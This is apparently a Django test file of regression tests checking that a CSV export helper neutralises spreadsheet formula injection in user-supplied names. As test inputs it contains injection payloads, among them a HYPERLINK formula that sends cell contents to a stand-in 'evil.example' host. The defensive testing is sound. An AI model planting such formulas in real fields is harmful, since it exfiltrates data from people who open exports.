"""
Repro tests from the adversarial review of claude/r3-ux. Each one failed on the branch as reviewed.
"""
import csv
import io
from decimal import Decimal

from django.test import SimpleTestCase
from django.utils import timezone

from changes.tests.base import CommercialTestBase
from core.exports import safe, safe_row
from tenancy.context import org_context
from variations.models import Variation


class _Named:
    """Any object whose text is someone's typing: a User (full_name), a Subcontractor (company_name)..."""

    def __init__(self, text):
        self.text = text

    def __str__(self):
        return self.text


class SafeObjectTests(SimpleTestCase):
    """
    core.exports.safe() returned str(value) for anything that wasn't already a str, unchecked. Exports pass
    model instances straight in (variations: decided_by; projects: owner; submittals: subcontractor, line),
    so a client who named themselves "=HYPERLINK(...)" at sign-up planted a live formula. procurement's own
    helper on main did str() first and then checked, so the move to core was a regression there.
    """

    def test_object_whose_text_is_a_formula_is_neutralised(self):
        for text in ('=HYPERLINK("https://evil.example","x")', '+1+cmd', '@SUM(A1)', '  =1+1', '-2+3'):
            with self.subTest(text=text):
                self.assertTrue(safe(_Named(text)).startswith("'"), safe(_Named(text)))

    def test_only_ascii_digits_count_as_a_plain_number(self):
        self.assertEqual(safe('-\u0661\u0662'), "'-\u0661\u0662")  # Arabic-Indic digits are text, not a number

    def test_numbers_dates_and_plain_objects_go_out_unchanged(self):
        today = timezone.localdate()
        self.assertEqual(safe_row([Decimal('-120.00'), -5, 1.5, today, _Named('Sid Joinery'), True]),
                         ['-120.00', '-5', '1.5', today.isoformat(), 'Sid Joinery', 'True'])


class VariationCsvDecidedByTests(CommercialTestBase):
    def test_client_name_formula_is_neutralised_in_variations_export(self):
        self.carla.full_name = '=HYPERLINK("https://evil.example/?"&A1,"Approved")'
        self.carla.save()
        with org_context(self.org_a):
            vo = Variation(project=self.pa, title='Extra sockets', description='x', status=Variation.STATUS_APPROVED,
                           value=Decimal('-120.00'), approved_value=Decimal('-120.00'), decided_by=self.carla,
                           decided_at=timezone.now())
            vo.save(actor=self.pat)
        self.login(self.pat)
        r = self.client.get(self.url('variation_list', self.pa.pk) + '?status=APPROVED&export=csv')
        self.assertEqual(r.status_code, 200)
        rows = list(csv.reader(io.StringIO(r.content.decode())))
        header, row = rows[0], rows[1]
        self.assertEqual(row[header.index('Decided by')][:1], "'")
        self.assertEqual(row[header.index('Quoted')], '-120.00')  # numbers are not corrupted
